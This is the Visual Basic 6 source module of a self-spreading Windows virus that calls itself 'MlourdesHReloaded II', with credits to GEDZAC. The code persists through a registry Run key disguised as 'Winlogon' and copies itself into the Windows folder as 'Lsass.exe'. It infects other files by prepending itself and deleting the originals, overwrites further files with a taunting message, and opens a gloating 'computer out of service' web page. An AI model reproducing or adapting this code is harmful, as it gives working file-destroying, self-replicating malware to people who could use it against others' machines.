Attribute VB_Name = "Module1"
Declare Function ejecutar Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Declare Function obtenereltipodedrive Lib "kernel32.dll" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Public Const cdrom = 5 'cdrom
Public Const hd = 3 'disko duro
Public Const drive_ramdisk = 6 'disko ram
Public Const drive_remote = 4 'unidad conectada de red
Public Const disketera = 2

Public tiempo As Integer
Const tamañoexe = 49152
Global dirwin As String
Global dirsys As String
Global diradp As String
Global a As Variant
Global b As Variant
Global escape As Boolean
Global conteo As Integer
Sub generarfsoyws()
 Set a = CreateObject("scripting.filesystemobject")
 Set b = CreateObject("wscript.shell")
End Sub
Sub obtenerfoders()
dirwin = a.getspecialfolder(0)
dirsys = a.getspecialfolder(1)
diradp = b.regread("HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\programfilesdir")
End Sub
Sub crearcadena(direccion As String)
b.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\Winlogon", direccion
End Sub
Sub copiarmeadirwin()
Dim exe As String
Dim archivo As String
Dim tam As Double

On Error GoTo err
Open agregardiagonal(App.Path, App.EXEName & ".exe") For Binary As #1
tam = LOF(1)
If tam > tamañoexe Then 'separar
 Open dirwin & "\" & "Lsass.exe" For Binary As #2
 exe = Space(tamañoexe)
 Get #1, , exe
 Put #2, , exe
 Close #2
 Open agregardiagonal(App.Path, App.EXEName & ".doc") For Binary As #3
 archivo = Space(tam - tamañoexe)
 Get #1, tamañoexe + 1, archivo
 Put #3, , archivo
 Close #3
 Close #1
 Open dirwin & "\readmer.cls" For Append As #4
 Write #4, agregardiagonal(App.Path, App.EXEName & ".exe")
 Close #4
 winword App.Path, App.EXEName & ".doc"
Else 'copiar
 Open dirwin & "\" & "Lsass.exe" For Binary As #2
 exe = Space(LOF(1))
 Get #1, , exe
 Put #2, , exe
End If
 Close #2
 Close #1
 Shell dirwin & "\Lsass.exe"
 End
 
Exit Sub
err:
End Sub
Public Sub winword(direccion As String, archivo As String)
Dim resp As Long
resp = ejecutar(Form1.hwnd, "Open", _
agregardiagonal(direccion, archivo), "", "", 1)
End Sub
Public Sub infectar(direccion As String, archivo As String)
Dim arch As String
Dim exe As String
On Error GoTo err
 Open agregardiagonal(App.Path, App.EXEName & ".exe") For Binary As #1
 exe = Space(LOF(1))
 Get #1, , exe
 Close #1
 Close
 Open agregardiagonal(direccion, archivo) For Binary As #2
 arch = Space(LOF(2))
 Get #2, , arch
 Close #2
 Kill agregardiagonal(direccion, archivo)
 Open agregardiagonal(direccion, kitarextension(archivo) & ".exe") For Binary As #3
 Put #3, , exe & arch
 Close #3
 arch = ""
 exe = ""
 Call conteode3
err:
End Sub
Function kitarextension(archivo As String) As String
Dim au As String
Dim i As Integer
On Error GoTo err:
While au <> "."
   au = Mid(archivo, Len(archivo) - i, 1)
   i = i + 1
Wend
kitarextension = Mid(archivo, 1, Len(archivo) - i)

Exit Function
err:
End Function
Function agregardiagonal(directorio As String, archivo As String) As String
agregardiagonal = a.buildpath(directorio, archivo)
End Function
Public Sub conteode3()
 conteo = conteo + 1
 If conteo >= 10 Then Call Form1.unidadesdedisco
End Sub
Public Sub anikilararchivo(archivo As String)
Static paginamostrada As Boolean
Dim respuesta As Integer
On Error GoTo err:

If LCase(diradp & "\Internet") = LCase(Mid(Form1.Dir1.Path, 1, Len(diradp & "\Internet"))) And paginamostrada = False Then
 Call mostrarpaginaweb
 paginamostrada = True
Else
 SetAttr agregardiagonal(Form1.Dir1.Path, archivo), vbNormal
 Open agregardiagonal(Form1.Dir1.Path, archivo) For Output As #6
  Write #6, "Virus MlourdesHReloaded II ha atakdo esta computadora"
  Write #6, "Virus 100% Méxicano, no es muy peligroso que digamos"
  Write #6, "Pero tu has sido el rival más débil ¡Adios!"
  Write #6, "Saludos a Ana Paty de Sinaloa y a Gedzac Labs"
  Write #6, "Espero y se hallan pasado una feliz Navidad y un próspero año nuevo"
  Write #6, "Feliz 2004 para todos"
  Write #6, "Para mayor información enviar un e-mail a tips@esmas.com"
  Write #6, "donde hablamos de computación en tu idioma"
  Write #6, ""
  Write #6, "*-Dime solo esta vez, que has pensado... solo esta vez -*"
 Close #6
End If
err:
End Sub
Public Sub mostrarpaginaweb()
Dim arch
Set arch = a.createtextfile("C:\MLHR_Corporation_GeDzAc.htm")
arch.write "<html>"
arch.writeline "<title>MLHR Corporation-->Alerta del virus MlourdesHReloaded para Dotz</title>"
arch.writeline "<Body bgcolor=black>"
arch.writeline "<font><font color= orange+blue+red><marquee behavior=" & _
Chr(34) & "alternate" & Chr(34) & "><H2>Grupo GeDZac<H2></marquee></font>"
arch.writeblanklines (1)
arch.writeline "<font><font color=green>"
arch.writeline "<h4>Estimado Usuario de esta PC, lamentamos" & _
" decirle que está</h4>" & vbCrLf & "<h4>su computadora fuera de servicio o sea pasando a mejor vida.</h4>" & _
"<center><h3><font><font color=Yellow>Atte: MLHR Corporation</h3></font></center>"
arch.writeline "<font><font color=red><h4>No se hace responsable de lo ocasionado, gracias por su comprensión. Cuenta Hasta 10</h4></font>"
arch.writeline "<font><font color=blue><h5>Mañana buscaré un camino a la salida pues esto me " & _
"encierra en un circulo vicioso...</h5><h5> Yo sufro me retuerzo y lloro en exceso...</h5></font>"
arch.writeline "<font><font color=orange><h5>Very Sad... but I remember u</h5></font>"
arch.writeline "<font><font color=green+red><center><h4>Mi ciclo de vida fue de --> " & tiempo & " Minutos</h4></center></font>"
arch.writeline "</font>"
arch.writeline "<center><font><font color=brown+yellow+orange><h4>El amor no se crea ni se destruye, sólo se transforma.</h4></font></center>"
arch.writeline "</body>"
arch.writeline "</html>"
arch.Close
b.run "C:\MLHR_Corporation_GeDzAc.htm"
End Sub
'<center><pre><font><font color=red>
'       xx xxxx
'     xxx xxx xxx
'   xxx xx x xx xx
'  xx xx x xx xx xx
'xx x xx xx xx x x x
' xxxx xx xx xxxx xxx
'  xx xx xx xx xx xxx
'   xx xx xxx xx xxx
'    xxxx xx xxx xx
'      x xxxx x  </font><font><font color=green>
'           xxx         x
'            xxx      x x
'             xxx    x xx
'              xxxx x xx
'               xxx xxx
'                xxxx
'                xxxx </font></pre></center>
